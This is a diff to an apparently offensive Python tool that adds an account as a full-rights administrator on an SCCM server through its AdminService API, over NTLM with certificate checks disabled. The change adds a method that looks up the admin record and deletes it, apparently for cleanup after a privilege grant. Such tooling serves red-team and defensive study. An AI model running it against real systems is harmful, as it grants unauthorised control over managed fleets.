@@ -11,6 +11,8 @@ class ADD_ADMIN:
         self.password = password
         self.target_ip = target_ip
         self.logs_dir = logs_dir
+        self.headers = {'Content-Type': 'application/json; odata=verbose'}
+        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 
     def jprint(self, obj):
@@ -18,13 +20,10 @@ class ADD_ADMIN:
         logger.debug(text)
 
 
-    def run(self, targetuser, targetsid):
+    def add(self, targetuser, targetsid):
         self.targetuser = targetuser
         self.targetsid = targetsid
 
-        headers = {'Content-Type': 'application/json; odata=verbose'}
-        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
-        
         body = {"LogonName": f"{self.targetuser}", 
             "AdminSid":f"{self.targetsid}",
             "Permissions":[{"CategoryID": "SMS00ALL", 
@@ -50,7 +49,7 @@ class ADD_ADMIN:
         try:
             r = requests.post(f"{url}",
                                 auth=HttpNtlmAuth(self.username, self.password),
-                                verify=False,headers=headers, json=body)
+                                verify=False,headers=self.headers, json=body)
             if r.status_code == 201:
                 logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
                 results = r.json()
@@ -60,3 +59,46 @@ class ADD_ADMIN:
                 logger.info(r.text)
         except Exception as e:
                 print(e)
+
+
+    def delete(self, targetuser):
+        self.targetuser = targetuser
+        try:
+            adminid = self.get_adminid()
+            url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin({adminid})"
+            r = requests.delete(f"{url}",
+                    auth=HttpNtlmAuth(self.username, self.password),
+                    verify=False,headers=self.headers)
+            if r.status_code == 204:
+                 logger.info(f"[+] Successfully removed {self.targetuser} as an admin.")
+            else:
+                 logger.info("[-] Something went wrong:")
+                 logger.info(r.text)
+        except Exception as e:
+                print(e)
+
+
+    def get_adminid(self):
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/?$filter=DisplayName eq '{self.targetuser}'"
+        try:
+            r = requests.get(f"{url}",
+                                auth=HttpNtlmAuth(self.username, self.password),
+                                verify=False,headers=self.headers)
+            if r.status_code == 200:
+                result = r.json()
+                adminid = result['value'][0]['AdminID']
+                logger.debug(f"[+] Got AdminID: {adminid}")
+                return adminid
+            else:
+                logger.info("[*] Something went wrong")
+                logger.info(r.text)
+                logger.info(r.status_code)
+        except Exception as e:
+                print(e)
+        
+         
+
+         # adminid = value[adminid]
+         #lookup sccm admin with provided args
+
+         #second request to delete the record
